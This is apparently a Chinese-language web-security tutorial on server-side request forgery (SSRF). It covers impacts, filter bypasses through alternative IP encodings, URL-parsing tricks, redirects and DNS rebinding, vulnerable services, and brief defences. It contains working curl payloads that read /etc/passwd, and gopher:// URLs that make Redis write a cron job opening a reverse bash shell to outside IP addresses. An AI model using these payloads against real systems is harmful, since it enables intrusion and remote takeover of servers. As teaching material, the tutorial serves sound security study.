SSRF
================================

漏洞危害
--------------------------------
- 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;
- 攻击运行在内网或本地的应用程序（比如溢出）;
- 对内网Web应用进行指纹识别，通过访问默认文件实现;
- 攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;
- 利用File协议读取本地文件。


利用方式
--------------------------------
SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。

以curl为例

::

    # dict protocol (操作Redis) 

    curl -vvv 'dict://127.0.0.1:6379/info' # file protocol (任意文件读取) 

    curl -vvv 'file:///etc/passwd' # gopher protocol (一键反弹Bash) 

    # * 注意: 链接使用单引号，避免$变量问题

    curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' 


过滤绕过
--------------------------------

更改IP地址写法
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：
::

    ^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$

    ^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$

    ^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$

对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：

::

    8进制格式：0300.0250.0.1

    16进制格式：0xC0.0xA8.0.1

    10进制整数格式：3232235521

    16进制整数格式：0xC0A80001

还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1


利用解析URL所出现的问题
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。

http://www.baidu.com@192.168.0.1/

当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。


利用302跳转
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。

(1) 在网络上存在一个很神奇的服务，http://xip.io 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。

(2) 由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，不过tinyurl.com所提供的短地址服务支持IP方式。

通过各种非HTTP协议
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。

(1) GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：

::

    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

(2) File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容


DNS Rebinding
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。

但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，可以进行DNS重绑定攻击。

要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

- 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
- 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
- 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
- 由于已经绕过验证，所以服务器端返回访问内网资源的结果。


可能利用的协议
--------------------------------
- ftp、ftps （FTP爆破） 
- tftp（UDP协议扩展） 
- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码） 
- rtsp - smb/smbs （连接SMB） 
- telnet 
- 连接SSH/Telnet 
- http、https - 内网服务探测 
- 网络服务探测 
- ShellShock命令执行 
- JBOSS远程Invoker war命令执行 
- Java调试接口命令执行 
- axis2-admin部署Server命令执行 
- Jenkins Scripts接口命令执行 
- Confluence SSRF 
- Struts2一堆命令执行 
- counchdb WEB API远程命令执行 
- mongodb SSRF 
- docker API远程命令执行 
- php_fpm/fastcgi 命令执行 
- tomcat命令执行 
- Elasticsearch引擎Groovy脚本命令执行 
- WebDav PUT上传任意文件 
- WebSphere Admin可部署war间接命令执行 
- Apache Hadoop远程命令执行 
- zentoPMS远程命令执行 
- HFS远程命令执行 
- glassfish任意文件读取和war文件部署间接命令执行

防御方式
--------------------------------
- 过滤返回的信息
- 统一错误信息
- 限制请求的端口
- 禁止不常用的协议
- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单

参考链接
--------------------------------
- `SSRF漏洞分析与利用 <http://www.91ri.org/17111.html>`_
- `A New Era Of SSRF <https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>`_
- `php ssrf technique <https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51>`_
- `谈一谈如何在Python开发中拒绝SSRF漏洞 <https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html>`_
